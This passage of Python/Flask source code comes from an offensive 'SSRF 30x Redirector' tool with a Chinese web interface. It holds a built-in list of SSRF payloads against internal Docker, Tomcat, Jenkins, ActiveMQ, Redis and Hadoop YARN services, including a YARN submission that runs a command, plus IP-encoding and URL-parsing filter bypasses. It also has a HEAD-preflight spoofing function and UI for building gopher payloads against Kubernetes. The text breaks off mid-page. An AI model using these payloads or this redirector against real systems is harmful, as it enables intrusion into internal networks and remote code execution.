    {'name': 'Docker exec (websocket)', 'category': 'Docker 渗透', 'method': 'GET', 'payload': 'http://127.0.0.1:2375/exec/container_id/start', 'description': 'Docker exec交互 (需容器ID)'},

    # ---------- 内网服务弱口令与未授权 ----------
    {'name': 'Tomcat Manager 登录', 'category': '内网未授权', 'method': 'GET', 'payload': 'http://127.0.0.1:8080/manager/html', 'description': 'Tomcat管理界面 (尝试弱口令)'},
    {'name': 'Jenkins Script Console (GET)', 'category': '内网未授权', 'method': 'GET', 'payload': 'http://127.0.0.1:8080/script', 'description': 'Jenkins脚本控制台 (未授权仍需POST执行Groovy)'},
    {'name': 'ActiveMQ 控制台 (默认未授权)', 'category': '内网未授权', 'method': 'GET', 'payload': 'http://127.0.0.1:8161/admin/', 'description': 'ActiveMQ管理界面'},
    {'name': 'Hadoop YARN ResourceManager', 'category': '内网未授权', 'method': 'POST', 
     'payload': 'http://127.0.0.1:8088/ws/v1/cluster/apps', 
     'description': 'Hadoop提交新应用 (可用于RCE)',
     'body': json.dumps({"application-id": "application_1234567890_0001", "application-name": "test", "am-container-spec": {"commands": {"command": "id"}}, "application-type": "YARN"})},

    # ---------- 内网探测基础 ----------
    {'name': '内网 HTTP OPTIONS 探测', 'category': '内网探测', 'method': 'OPTIONS', 'payload': 'http://127.0.0.1:80/', 'description': '探测内网服务支持的方法'},
    {'name': '内网 HTTP TRACE 探测', 'category': '内网探测', 'method': 'TRACE', 'payload': 'http://127.0.0.1:8080/', 'description': '探测内网XST漏洞'},
    {'name': 'Redis dict协议探测', 'category': '内网探测', 'method': 'GET', 'payload': 'dict://127.0.0.1:6379/INFO', 'description': 'dict协议探测Redis'},

    # ---------- SSRF 绕过技巧 ----------
    {'name': '十进制IP绕过 (127.0.0.1)', 'category': '绕过技巧', 'method': 'GET', 'payload': 'http://2130706433/', 'description': '127.0.0.1的十进制表示'},
    {'name': '十六进制IP绕过', 'category': '绕过技巧', 'method': 'GET', 'payload': 'http://0x7f.0.0.1/', 'description': '127.0.0.1的十六进制形式'},
    {'name': 'IPv6映射绕过', 'category': '绕过技巧', 'method': 'GET', 'payload': 'http://[::ffff:127.0.0.1]/', 'description': 'IPv6映射的IPv4地址'},
    {'name': 'DNS重绑定域名 (localtest.me)', 'category': '绕过技巧', 'method': 'GET', 'payload': 'http://localtest.me/', 'description': '解析到127.0.0.1的域名可用于绕过黑名单'},
    {'name': 'URL解析混淆 (userinfo部分)', 'category': '绕过技巧', 'method': 'GET', 'payload': 'http://google.com@127.0.0.1/', 'description': '利用URL中@符号欺骗'},
]

# ==================== 工具函数 ====================
def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def get_beijing_time():
    """获取北京时间字符串"""
    return datetime.now(BEIJING_TZ).strftime('%Y-%m-%d %H:%M:%S')

def log_request(extra_data=None):
    request_body = request.get_data().decode('utf-8', errors='replace')
    log_entry = {
        'id': str(uuid.uuid4())[:8],
        'timestamp': get_beijing_time(),
        'ip': get_client_ip(),
        'method': request.method,
        'path': request.path,
        'headers': dict(request.headers),
        'args': dict(request.args),
        'request_body': request_body[:500] + ('...' if len(request_body)>500 else ''),
        'redirect_url': None,
        'status_code': None,
        'response_headers': {},
        'response_body': '',
        'extra_data': extra_data or {}
    }
    LOGS.insert(0, log_entry)
    if len(LOGS) > CONFIG['max_logs']: LOGS.pop()
    return log_entry

def check_access_token():
    if CONFIG['access_token']:
        token = request.args.get('token') or request.headers.get('X-Access-Token')
        if token != CONFIG['access_token']: return False
    return True

def make_head_bypass_response(target_url=None, custom_status=None, custom_headers=None, custom_body=None):
    """
    构造HEAD伪装响应，让服务器认为目标存在。
    支持多种伪装策略:
    - 200: 标准200 OK (默认)
    - 自定义状态码和响应体
    """
    status = custom_status or HEAD_BYPASS_CONFIG['status_code']
    
    # 构造响应体 (HEAD请求通常不返回body, 但设置Content-Length)
    body_content = custom_body or ''
    if request.method == 'HEAD':
        # HEAD 不返回body, 但返回Content-Length暗示有内容
        response = make_response('', status)
        response.headers['Content-Length'] = HEAD_BYPASS_CONFIG['fake_content_length']
    else:
        response = make_response(body_content, status)
    
    # 设置伪装的响应头
    response.headers['Content-Type'] = HEAD_BYPASS_CONFIG['content_type']
    for k, v in HEAD_BYPASS_CONFIG['extra_headers'].items():
        response.headers[k] = v
    
    # 覆盖自定义头
    if custom_headers:
        for k, v in custom_headers.items():
            response.headers[k] = v
    
    return response

def should_bypass_head(head_bypass_flag):
    """
    判断是否应该对HEAD请求进行伪装绕过。
    head_bypass_flag: 可以是 '1', 'true', True, 'auto' 等
    """
    if not head_bypass_flag:
        return False
    if isinstance(head_bypass_flag, str):
        return head_bypass_flag.lower() in ('1', 'true', 'yes', 'on', 'auto')
    return bool(head_bypass_flag)

# ==================== Web界面模板 ====================
INDEX_HTML = """
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSRF 30x Redirector</title>
    <style>
        :root {
            --bg-primary: #0d1117;
            --bg-secondary: #161b22;
            --bg-card: #1c2128;
            --bg-input: #0d1117;
            --border-color: rgba(56, 189, 248, 0.12);
            --border-hover: rgba(56, 189, 248, 0.45);
            --accent: #58a6ff;
            --accent-green: #3fb950;
            --accent-red: #f85149;
            --accent-yellow: #d29922;
            --accent-purple: #bc8cff;
            --accent-orange: #f0883e;
            --accent-cyan: #39d5ff;
            --text-primary: #e6edf3;
            --text-secondary: #8b949e;
            --text-muted: #6e7681;
            --radius: 12px;
            --radius-sm: 8px;
            --shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
            --transition: all 0.2s ease;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans SC', Roboto, Helvetica, Arial, sans-serif;
            background: var(--bg-primary);
            min-height: 100vh;
            color: var(--text-primary);
            padding: 32px 40px;
            font-size: 15px;
            line-height: 1.6;
        }
        .container { max-width: 1800px; margin: 0 auto; }

        /* Header */
        .header {
            text-align: center;
            padding: 32px 0 28px;
            margin-bottom: 32px;
            border-bottom: 1px solid var(--border-color);
        }
        .header h1 {
            color: var(--accent);
            font-size: 2.2em;
            margin-bottom: 10px;
            font-weight: 800;
            letter-spacing: -0.5px;
        }
        .header p {
            color: var(--text-secondary);
            font-size: 0.95em;
            max-width: 900px;
            margin: 0 auto;
        }

        /* Stats */
        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 16px;
            margin-bottom: 32px;
        }
        .stat-item {
            text-align: center;
            padding: 22px 16px;
            background: var(--bg-card);
            border-radius: var(--radius);
            border: 1px solid var(--border-color);
            transition: var(--transition);
        }
        .stat-item:hover {
            border-color: var(--border-hover);
            transform: translateY(-2px);
        }
        .stat-value {
            font-size: 2.2em;
            font-weight: 800;
            color: var(--accent-green);
            line-height: 1.2;
        }
        .stat-label {
            color: var(--text-muted);
            font-size: 13px;
            margin-top: 6px;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: 600;
        }

        /* Grid Layout */
        .grid {
            display: grid;
            grid-template-columns: 1.5fr 0.5fr;
            gap: 24px;
            margin-bottom: 40px;
        }

        /* Card */
        .card {
            background: var(--bg-card);
            border-radius: var(--radius);
            padding: 32px;
            border: 1px solid var(--border-color);
            box-shadow: var(--shadow);
        }
        .card h2 {
            color: var(--accent);
            margin-bottom: 24px;
            font-size: 1.3em;
            font-weight: 700;
        }

        /* Form */
        .form-group { margin-bottom: 20px; }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: var(--text-secondary);
            font-weight: 600;
            font-size: 13px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .form-group select,
        .form-group input,
        select,
        input[type="text"] {
            width: 100%;
            padding: 14px 18px;
            background: var(--bg-input);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-sm);
            color: var(--text-primary);
            font-size: 15px;
            transition: var(--transition);
            line-height: 1.4;
        }
        .form-group select:focus,
        .form-group input:focus,
        select:focus,
        input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.1);
        }
        textarea {
            width: 100%;
            padding: 14px 18px;
            background: var(--bg-input);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-sm);
            color: var(--text-primary);
            font-size: 14px;
            transition: var(--transition);
            line-height: 1.5;
            resize: vertical;
        }
        textarea:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.1);
        }

        /* Buttons */
        .btn {
            background: var(--accent);
            color: #0d1117;
            border: none;
            padding: 12px 24px;
            border-radius: var(--radius-sm);
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            transition: var(--transition);
            letter-spacing: 0.3px;
        }
        .btn:hover { opacity: 0.88; transform: translateY(-1px); }
        .btn:active { transform: translateY(0); }
        .btn-secondary { background: var(--accent-purple); color: #fff; }
        .btn-warning { background: var(--accent-yellow); color: #0d1117; }
        .btn-danger { background: var(--accent-red); color: #fff; padding: 8px 16px; font-size: 13px; }
        .btn-small { padding: 8px 18px; font-size: 13px; }
        .btn-ghost {
            background: transparent;
            border: 1px solid var(--border-color);
            color: var(--text-secondary);
        }
        .btn-ghost:hover { border-color: var(--accent); color: var(--accent); }
        .btn-orange { background: var(--accent-orange); color: #0d1117; }
        .btn-cyan { background: var(--accent-cyan); color: #0d1117; }

        /* Result */
        .result-box {
            margin-top: 24px;
            padding: 20px;
            background: rgba(63, 185, 80, 0.04);
            border-radius: var(--radius);
            border: 1px solid rgba(63, 185, 80, 0.25);
            display: none;
        }
        .result-box.show { display: block; }
        .payload-url {
            font-family: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace;
            word-break: break-all;
            padding: 16px;
            background: var(--bg-input);
            border-radius: var(--radius-sm);
            font-size: 14px;
            color: var(--accent-yellow);
            user-select: all;
            margin-bottom: 14px;
            line-height: 1.7;
            border: 1px solid var(--border-color);
        }
        .copy-btn {
            padding: 10px 20px;
            background: rgba(63, 185, 80, 0.12);
            color: var(--accent-green);
            border: 1px solid rgba(63, 185, 80, 0.3);
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            transition: var(--transition);
        }
        .copy-btn:hover { background: rgba(63, 185, 80, 0.22); }

        /* Tabs */
        .nav-tabs {
            display: flex;
            gap: 6px;
            margin-bottom: 24px;
            background: var(--bg-input);
            border-radius: var(--radius-sm);
            padding: 6px;
            border: 1px solid var(--border-color);
        }
        .nav-tab {
            padding: 10px 22px;
            background: transparent;
            border: none;
            border-radius: 6px;
            color: var(--text-muted);
            cursor: pointer;
            transition: var(--transition);
            font-size: 14px;
            font-weight: 600;
        }
        .nav-tab:hover { color: var(--text-primary); }
        .nav-tab.active { background: var(--accent); color: #0d1117; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }

        /* Steps */
        .step-item {
            border-radius: var(--radius-sm);
            padding: 18px;
            margin-bottom: 14px;
            border: 1px solid var(--border-color);
            background: var(--bg-input);
            transition: var(--transition);
        }
        .step-item:hover { border-color: var(--border-hover); }
        .step-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }
        .step-title { font-weight: 700; font-size: 14px; }
        .step-form { display: grid; grid-template-columns: 1fr; gap: 10px; }
        .step-input-group { display: flex; gap: 10px; width: 100%; }

        /* Protocol Tip */
        .protocol-tip {
            font-size: 14px;
            color: var(--text-secondary);
            background: var(--bg-input);
            padding: 16px 20px;
            border-radius: var(--radius-sm);
            border-left: 4px solid var(--accent-yellow);
            margin-bottom: 20px;
            line-height: 1.7;
        }
        .protocol-tip.tip-cyan { border-left-color: var(--accent-cyan); }

        /* HEAD Bypass Toggle */
        .head-bypass-toggle {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 12px 16px;
            background: rgba(57, 213, 255, 0.04);
            border: 1px solid rgba(57, 213, 255, 0.2);
            border-radius: var(--radius-sm);
            margin-bottom: 16px;
            cursor: pointer;
            transition: var(--transition);
        }
        .head-bypass-toggle:hover {
            border-color: rgba(57, 213, 255, 0.5);
            background: rgba(57, 213, 255, 0.08);
        }
        .head-bypass-toggle input[type="checkbox"] {
            width: 18px;
            height: 18px;
            accent-color: var(--accent-cyan);
            cursor: pointer;
        }
        .head-bypass-toggle .toggle-label {
            font-size: 14px;
            font-weight: 600;
            color: var(--accent-cyan);
        }
        .head-bypass-toggle .toggle-desc {
            font-size: 12px;
            color: var(--text-muted);
            margin-left: auto;
        }
        .head-bypass-config {
            display: none;
            margin-top: 10px;
            padding: 14px;
            background: var(--bg-primary);
            border: 1px dashed rgba(57, 213, 255, 0.3);
            border-radius: var(--radius-sm);
        }
        .head-bypass-config.show { display: block; }
        .head-bypass-config label {
            font-size: 12px;
            color: var(--accent-cyan);
            margin-bottom: 4px;
            display: block;
        }
        .head-bypass-config input,
        .head-bypass-config select {
            padding: 8px 12px;
            font-size: 13px;
            margin-bottom: 8px;
        }

        /* Logs */
        .logs-container { max-height: 750px; overflow-y: auto; }
        .log-entry {
            background: var(--bg-input);
            border-radius: var(--radius-sm);
            padding: 16px 18px;
            margin-bottom: 10px;
            border-left: 4px solid var(--accent-green);
            font-size: 13px;
            cursor: pointer;
            transition: var(--transition);
            position: relative;
            border: 1px solid var(--border-color);
            border-left: 4px solid var(--accent-green);
        }
        .log-entry.log-head-bypass { border-left-color: var(--accent-cyan); }
        .log-entry:hover { background: rgba(56, 189, 248, 0.04); border-color: var(--border-hover); border-left-color: var(--accent-green); }
        .log-entry.log-head-bypass:hover { border-left-color: var(--accent-cyan); }
        .log-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
        }
        .log-ip { color: var(--accent-red); font-weight: 700; font-size: 14px; }
        .log-detail {
            display: grid;
            grid-template-columns: 80px 1fr;
            gap: 6px;
            align-items: baseline;
        }
        .log-label { color: var(--text-muted); font-size: 12px; font-weight: 600; text-transform: uppercase; }
        .log-value { color: var(--text-secondary); word-break: break-all; font-size: 13px; }
        .log-value.url { color: var(--accent-yellow); }
        .method-badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 800;
            margin-right: 6px;
            letter-spacing: 0.3px;
        }
        .method-GET { background: rgba(63, 185, 80, 0.15); color: var(--accent-green); }
        .method-POST { background: rgba(248, 81, 73, 0.15); color: var(--accent-red); }
        .method-OPTIONS { background: rgba(210, 153, 34, 0.15); color: var(--accent-yellow); }
        .method-PUT { background: rgba(188, 140, 255, 0.15); color: var(--accent-purple); }
        .method-HEAD { background: rgba(57, 213, 255, 0.15); color: var(--accent-cyan); }
        pre.log-pre {
            margin: 0;
            font-size: 12px;
            white-space: pre-wrap;
            word-break: break-word;
            max-height: 220px;
            overflow-y: auto;
            background: var(--bg-primary);
            padding: 14px;
            border-radius: var(--radius-sm);
            color: var(--text-secondary);
            border: 1px solid var(--border-color);
            line-height: 1.6;
        }
        .delete-log-btn {
            position: absolute;
            top: 10px;
            right: 10px;
            background: rgba(248, 81, 73, 0.12);
            color: var(--accent-red);
            border: none;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            font-size: 13px;
            line-height: 1;
            cursor: pointer;
            display: none;
            align-items: center;
            justify-content: center;
            padding: 0;
            transition: var(--transition);
        }
        .delete-log-btn:hover { background: rgba(248, 81, 73, 0.25); }
        .log-entry:hover .delete-log-btn { display: flex; }

        /* Request Editor */
        .req-editor {
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-sm);
            padding: 18px;
            margin-top: 14px;
        }
        .req-editor label {
            font-size: 12px;
            color: var(--text-muted);
            display: block;
            margin-bottom: 6px;
            text-transform: uppercase;
            font-weight: 600;
            letter-spacing: 0.5px;
        }
        .req-editor input,
        .req-editor textarea,
        .req-editor select {
            width: 100%;
            padding: 12px 14px;
            background: var(--bg-input);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            color: var(--text-primary);
            margin-bottom: 10px;
            font-size: 14px;
        }
        .req-editor textarea {
            min-height: 90px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            resize: vertical;
        }
        .header-row {
            display: flex;
            gap: 8px;
            margin-bottom: 8px;
        }
        .header-row input { flex: 1; }
        .header-row button { flex: 0 0 auto; }

        /* Dual Editor Layout */
        .dual-editor-layout {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
            margin-top: 14px;
        }
        .dual-editor-layout .req-editor {
            margin-top: 0;
        }
        .raw-editor-panel {
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-sm);
            padding: 18px;
        }
        .raw-editor-panel .raw-title {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }
        .raw-editor-panel .raw-title h4 {
            font-size: 13px;
            color: var(--accent-orange);
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .raw-editor-panel textarea.raw-request-area {
            width: 100%;
            min-height: 320px;
            padding: 16px;
            background: var(--bg-input);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-sm);
            color: var(--accent-green);
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 13px;
            line-height: 1.6;
            resize: vertical;
            white-space: pre;
            overflow-wrap: normal;
            overflow-x: auto;
        }
        .raw-editor-panel textarea.raw-request-area:focus {
            outline: none;
            border-color: var(--accent-orange);
            box-shadow: 0 0 0 3px rgba(240, 136, 62, 0.1);
        }
        .raw-editor-btns {
            display: flex;
            gap: 8px;
            margin-top: 12px;
            flex-wrap: wrap;
        }

        /* Chain Manager */
        .chain-manager {
            margin-top: 28px;
            border-top: 1px solid var(--border-color);
            padding-top: 28px;
        }
        .chain-manager h3 {
            color: var(--accent);
            margin-bottom: 18px;
            font-size: 1.1em;
            font-weight: 700;
        }
        .chain-item {
            background: var(--bg-input);
            border-radius: var(--radius-sm);
            padding: 20px;
            margin-bottom: 14px;
            border: 1px solid var(--border-color);
            transition: var(--transition);
        }
        .chain-item:hover { border-color: var(--border-hover); }
        .chain-item-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }
        .chain-item-id { color: var(--accent); font-weight: 700; font-size: 15px; }
        .chain-item-time { color: var(--text-muted); font-size: 12px; }
        .chain-item-steps { font-size: 13px; color: var(--text-secondary); margin-bottom: 10px; line-height: 1.7; }
        .chain-item-steps .step-path { color: var(--accent-yellow); margin-right: 4px; font-weight: 600; }
        .chain-item-final {
            font-size: 13px;
            color: var(--accent-green);
            word-break: break-all;
            margin-bottom: 12px;
            padding: 12px;
            background: var(--bg-primary);
            border-radius: 6px;
            font-family: 'JetBrains Mono', monospace;
            border: 1px solid var(--border-color);
        }
        .chain-item-actions {
            display: flex;
            gap: 10px;
            align-items: center;
            flex-wrap: wrap;
        }
        .chain-edit-input {
            flex: 1;
            min-width: 200px;
            padding: 10px 14px;
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            color: var(--text-primary);
            font-size: 13px;
            font-family: 'JetBrains Mono', monospace;
        }
        .chain-edit-btn {
            padding: 8px 16px;
            font-size: 13px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 700;
            transition: var(--transition);
        }
        .chain-edit-btn:hover { opacity: 0.85; transform: translateY(-1px); }
        .chain-save-btn { background: var(--accent-green); color: #0d1117; }
        .chain-delete-btn { background: var(--accent-red); color: #fff; }
        .chain-copy-btn { background: var(--accent); color: #0d1117; }
        .no-chains-msg { text-align: center; padding: 40px; color: var(--text-muted); font-size: 15px; }

        /* HEAD badge in chain */
        .head-bypass-badge {
            display: inline-flex;
            align-items: center;
            gap: 4px;
            padding: 3px 10px;
            background: rgba(57, 213, 255, 0.1);
            color: var(--accent-cyan);
            border-radius: 12px;
            font-size: 11px;
            font-weight: 700;
            margin-left: 8px;
        }

        /* Queue */
        .queue-section {
            margin-top: 16px;
            border-top: 1px solid var(--border-color);
            padding-top: 16px;
        }
        .queue-section h4 {
            font-size: 13px;
            color: var(--accent-purple);
            margin-bottom: 10px;
            font-weight: 700;
        }
        .queue-textarea {
            width: 100%;
            min-height: 100px;
            padding: 14px;
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-sm);
            color: var(--text-primary);
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            resize: vertical;
            margin-bottom: 10px;
            line-height: 1.6;
        }
        .queue-textarea:focus { outline: none; border-color: var(--accent-purple); }
        .queue-status {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-top: 10px;
            font-size: 13px;
            color: var(--text-secondary);
        }
        .queue-badge {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            padding: 4px 10px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 700;
        }
        .queue-badge-active { background: rgba(63, 185, 80, 0.12); color: var(--accent-green); }
        .queue-badge-count { background: rgba(188, 140, 255, 0.12); color: var(--accent-purple); }
        .queue-mode-label {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
            color: var(--text-secondary);
            margin-bottom: 8px;
        }
        .queue-mode-label select { width: auto; padding: 6px 10px; font-size: 13px; }

        /* Queue Preset Buttons */
        .queue-presets-section {
            margin-bottom: 14px;
            padding: 14px;
            background: rgba(188, 140, 255, 0.04);
            border: 1px solid rgba(188, 140, 255, 0.15);
            border-radius: var(--radius-sm);
        }
        .queue-presets-section .preset-title {
            font-size: 12px;
            color: var(--accent-purple);
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 10px;
        }
        .preset-btns {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
        }
        .preset-btn {
            padding: 6px 14px;
            font-size: 12px;
            font-weight: 600;
            border: 1px solid rgba(188, 140, 255, 0.3);
            background: rgba(188, 140, 255, 0.08);
            color: var(--accent-purple);
            border-radius: 6px;
            cursor: pointer;
            transition: var(--transition);
            white-space: nowrap;
        }
        .preset-btn:hover {
            background: rgba(188, 140, 255, 0.2);
            border-color: var(--accent-purple);
            transform: translateY(-1px);
        }
        .preset-btn.active {
            background: var(--accent-purple);
            color: #0d1117;
            border-color: var(--accent-purple);
        }
        .preset-desc {
            font-size: 12px;
            color: var(--text-muted);
            margin-top: 8px;
            padding: 6px 10px;
            background: var(--bg-primary);
            border-radius: 4px;
            display: none;
        }
        .preset-desc.show { display: block; }

        .copy-raw-btn {
            background: rgba(88, 166, 255, 0.08);
            color: var(--accent);
            border: 1px solid rgba(88, 166, 255, 0.25);
            padding: 4px 10px;
            border-radius: 4px;
            font-size: 11px;
            cursor: pointer;
            margin-left: 8px;
            transition: var(--transition);
        }
        .copy-raw-btn:hover { background: rgba(88, 166, 255, 0.18); }
        .manual-refresh-btn {
            background: rgba(88, 166, 255, 0.08);
            color: var(--accent);
            border: 1px solid rgba(88, 166, 255, 0.25);
            padding: 8px 18px;
            border-radius: var(--radius-sm);
            font-size: 14px;
            cursor: pointer;
            font-weight: 600;
            transition: var(--transition);
        }
        .manual-refresh-btn:hover { background: rgba(88, 166, 255, 0.18); }

        /* Scrollbar */
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: rgba(88, 166, 255, 0.15); border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: rgba(88, 166, 255, 0.3); }

        /* Responsive */
        @media (max-width: 1200px) {
            .grid { grid-template-columns: 1fr; }
            .dual-editor-layout { grid-template-columns: 1fr; }
            body { padding: 20px; }
        }
        @media (max-width: 768px) {
            .stats { grid-template-columns: repeat(2, 1fr); }
            .header h1 { font-size: 1.6em; }
            body { padding: 16px; font-size: 14px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚡ SSRF 30x Redirector</h1>
            <p>云原生穿透引擎 · K8s/Docker 307无损引流 · Gopher封装 · 批量队列投递 · Burp风格编辑器 · HEAD伪装绕过</p>
        </div>
        <div class="stats">
            <div class="stat-item"><div class="stat-value" id="totalLogs">0</div><div class="stat-label">访问记录</div></div>
            <div class="stat-item"><div class="stat-value" id="uniqueIPs">0</div><div class="stat-label">唯一IP</div></div>
            <div class="stat-item"><div class="stat-value">{{ poc_count }}</div><div class="stat-label">内置POC</div></div>
            <div class="stat-item"><div class="stat-value" style="color:var(--accent);" id="chainCount">0</div><div class="stat-label">活跃链</div></div>
        </div>
        
        <div class="grid">
            <div class="card">
                <h2>🛠 Payload 构建控制台</h2>
                <div class="nav-tabs">
                    <button class="nav-tab active" data-tab="basic">基础跳转</button>
                    <button class="nav-tab" data-tab="stateless">智能链</button>
                    <button class="nav-tab" data-tab="stateful">有状态链</button>
                </div>
                
                <!-- 基础单次模式 -->
                <div id="tab-basic" class="tab-content active">
                    <div class="protocol-tip tip-cyan">
                        <b>🛡️ HEAD伪装模式说明：</b> 某些服务器(如Java HttpURLConnection)会先用HEAD请求探测，如果收到30x则认为目标不存在而拒绝后续GET请求。<br>
                        开启HEAD伪装后，HEAD请求返回200 OK(通过预检)，GET/POST等请求正常返回30x重定向(触发SSRF)。
                    </div>
                    <div class="head-bypass-toggle" onclick="document.getElementById('hbBasicCheck').click();">
                        <input type="checkbox" id="hbBasicCheck" onclick="event.stopPropagation(); toggleHeadBypassConfig('basic');">
                        <span class="toggle-label">🔀 启用 HEAD 伪装绕过</span>
                        <span class="toggle-desc">HEAD→200 / GET→30x</span>
                    </div>
                    <div class="head-bypass-config" id="hbBasicConfig">
                        <label>HEAD响应伪装状态码</label>
                        <select id="hbBasicStatus">
                            <option value="200" selected>200 OK (推荐)</option>
                            <option value="204">204 No Content</option>
                            <option value="403">403 Forbidden (伪装需认证)</option>
                        </select>
                        <label>Content-Type 伪装</label>
                        <input type="text" id="hbBasicContentType" value="text/html; charset=utf-8" placeholder="text/html; charset=utf-8">
                        <label>伪装 Content-Length</label>
                        <input type="text" id="hbBasicContentLength" value="8192" placeholder="8192">
                    </div>
                    <div class="form-group">
                        <label>响应码 (K8s HTTPS POST → 选 307)</label>
                        <select id="statusCode"></select>
                    </div>
                    <div class="form-group">
                        <label>快捷POC</label>
                        <select id="pocSelect"><option value="">-- 手动输入目标URL --</option></select>
                    </div>
                    <div class="form-group">
                        <label>目标URL (支持 dict/gopher/file)</label>
                        <input type="text" id="targetUrl" placeholder="http://127.0.0.1/">
                    </div>
                    <button class="btn btn-warning btn-small" onclick="toggleBasicEditor()" style="margin-bottom:14px;">✏️ 高级请求编辑</button>
                    <div class="dual-editor-layout" id="basicDualEditor" style="display:none;">
                        <div class="req-editor" id="basicReqEditor">
                            <label style="color:var(--accent);font-size:13px;margin-bottom:14px;display:block;">📝 结构化编辑</label>
                            <label>请求方法</label>
                            <select class="req-method">
                                <option value="GET">GET</option>
                                <option value="POST" selected>POST</option>
                                <option value="PUT">PUT</option>
                                <option value="DELETE">DELETE</option>
                                <option value="OPTIONS">OPTIONS</option>
                                <option value="HEAD">HEAD</option>
                                <option value="PATCH">PATCH</option>
                            </select>
                            <label>Host</label>
                            <input type="text" class="req-host" placeholder="127.0.0.1:8080">
                            <label>路径</label>
                            <input type="text" class="req-path" placeholder="/api/v1/...">
                            <label>请求头</label>
                            <div class="req-headers" id="basicReqHeaders"></div>
                            <button class="btn btn-ghost btn-small" onclick="addHeaderRow('basicReqHeaders')" style="margin-bottom:10px;">+ 添加请求头</button>
                            <label>请求体</label>
                            <textarea class="req-body" placeholder="JSON或任意格式"></textarea>
                            <div style="display:flex;gap:8px;margin-top:8px;">
                                <button class="btn btn-small" onclick="applyBasicCustomRequest()">✅ 生成 Gopher Payload</button>
                                <button class="btn btn-orange btn-small" onclick="syncStructuredToRaw('basicReqEditor','basicRawArea')">→ 同步到Raw</button>
                            </div>
                        </div>
                        <div class="raw-editor-panel" id="basicRawPanel">
                            <div class="raw-title">
                                <h4>🔧 Burp 风格 Raw 编辑器</h4>
                                <button class="copy-raw-btn" onclick="copyRawEditorContent('basicRawArea')">📋 复制</button>
                            </div>
                            <textarea class="raw-request-area" id="basicRawArea" placeholder="粘贴或编辑原始HTTP请求:&#10;&#10;POST /api/v1/pods HTTP/1.1&#10;Host: kubernetes.default.svc&#10;Content-Type: application/json&#10;Authorization: Bearer <token>&#10;&#10;{&quot;apiVersion&quot;:&quot;v1&quot;,...}" spellcheck="false"></textarea>
                            <div class="raw-editor-btns">
                                <button class="btn btn-orange btn-small" onclick="parseRawToStructured('basicRawArea','basicReqEditor')">← 解析到结构化</button>
                                <button class="btn btn-small" onclick="rawToGopher('basicRawArea','targetUrl')">✅ Raw → Gopher</button>
                                <button class="btn btn-ghost btn-small" onclick="beautifyRawBody('basicRawArea')">🎨 格式化Body</button>
                            </div>
                        </div>
                    </div>
                    <button class="btn" onclick="generateBasicPayload()" style="margin-top:14px;">生成 Payload</button>
                </div>

                <!-- 无状态链式模式 -->
                <div id="tab-stateless" class="tab-content">
                    <div class="protocol-tip">
                        <b>云原生 POST 说明：</b> HTTP目标可用 Gopher 封装POST请求；HTTPS目标 (如K8s) 自动切 307 保留方法。
                    </div>
                    <div class="head-bypass-toggle" onclick="document.getElementById('hbStatelessCheck').click();">
                        <input type="checkbox" id="hbStatelessCheck" onclick="event.stopPropagation();">
                        <span class="toggle-label">🔀 启用 HEAD 伪装绕过 (全链)</span>
                        <span class="toggle-desc">所有节点HEAD→200</span>
                    </div>
                    
                    <div style="margin-bottom: 16px; display: flex; gap: 10px; flex-wrap: wrap;">
                        <button class="btn btn-secondary btn-small" onclick="addStatelessStep(false)">+ 中转节点</button>
                        <button class="btn btn-small" onclick="addStatelessStep(true)">+ 终点节点</button>
